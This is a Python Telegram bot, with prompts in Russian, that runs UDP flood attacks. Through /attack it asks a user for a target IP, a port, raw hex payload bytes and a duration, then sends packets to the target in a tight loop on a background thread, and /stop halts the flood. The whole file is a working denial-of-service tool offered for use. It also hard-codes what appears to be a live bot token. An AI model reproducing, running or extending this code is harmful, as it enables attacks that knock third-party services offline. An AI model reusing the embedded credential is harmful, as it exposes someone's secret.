import os
import socket
import threading
import time
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = "8908217414:AAE5kpUsI6CZgSfybD1VJnrxGHZeYQgpuo8"

active_attacks = {}

def hex_to_bytes(hex_text):
    hex_text = re.sub(r'[^0-9a-fA-F]', '', hex_text)
    try:
        return bytes.fromhex(hex_text)
    except:
        return None

def attack_worker(chat_id, ip, port, payload, seconds):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + seconds
    sent = 0
    while time.time() < end and active_attacks.get(chat_id, False):
        sock.sendto(payload, (ip, port))
        sent += 1
    active_attacks[chat_id] = False
    sock.close()

async def start(update, context):
    await update.message.reply_text("Бот готов. Отправь /attack")

async def attack(update, context):
    chat_id = update.effective_chat.id
    active_attacks[chat_id] = False
    context.user_data.clear()
    context.user_data['step'] = 'ip'
    await update.message.reply_text("IP:")

async def stop(update, context):
    chat_id = update.effective_chat.id
    active_attacks[chat_id] = False
    await update.message.reply_text("Атака остановлена")

async def handle_text(update, context):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    step = context.user_data.get('step')

    if step == 'ip':
        context.user_data['ip'] = text
        context.user_data['step'] = 'port'
        await update.message.reply_text("Порт:")
    elif step == 'port':
        try:
            context.user_data['port'] = int(text)
            context.user_data['step'] = 'hex'
            await update.message.reply_text("HEX байты (любой формат):")
        except:
            await update.message.reply_text("Ошибка, введи число:")
    elif step == 'hex':
        payload = hex_to_bytes(text)
        if not payload:
            await update.message.reply_text("HEX не распознан, попробуй ещё:")
            return
        context.user_data['payload'] = payload
        context.user_data['step'] = 'seconds'
        await update.message.reply_text("Секунд атаки:")
    elif step == 'seconds':
        try:
            seconds = int(text)
            ip = context.user_data['ip']
            port = context.user_data['port']
            payload = context.user_data['payload']
            active_attacks[chat_id] = True
            threading.Thread(target=attack_worker, args=(chat_id, ip, port, payload, seconds), daemon=True).start()
            await update.message.reply_text(f"Атака на {ip}:{port} запущена на {seconds} сек")
            context.user_data.clear()
        except:
            await update.message.reply_text("Ошибка, введи число:")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling()

if __name__ == "__main__":
    main()
